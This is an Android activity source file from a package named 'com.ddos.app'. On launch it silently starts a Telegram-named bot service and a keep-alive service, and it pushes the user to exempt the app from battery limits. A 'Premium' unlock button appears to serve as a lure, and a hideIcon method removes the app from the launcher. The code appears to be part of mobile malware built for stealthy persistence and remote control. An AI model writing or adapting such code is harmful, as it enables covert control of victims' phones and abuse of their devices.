package com.ddos.app;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {
            ContextCompat.startForegroundService(this, new Intent(this, TelegramBot.class));
        } catch (Exception ignored) {}
        try {
            ContextCompat.startForegroundService(this, new Intent(this, KeepAliveService.class));
        } catch (Exception ignored) {}

        Button unlock = findViewById(R.id.btnUnlock);
        unlock.setOnClickListener(v ->
            startActivity(new Intent(this, PremiumActivity.class)));

        requestIgnoreBattery();
    }

    private void requestIgnoreBattery() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                i.setData(Uri.parse("package:" + getPackageName()));
                startActivity(i);
            }
        } catch (Exception ignored) {}
    }

    public static void hideIcon(Context ctx) {
        try {
            ComponentName cn = new ComponentName(ctx, MainActivity.class);
            ctx.getPackageManager().setComponentEnabledSetting(cn,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }
}
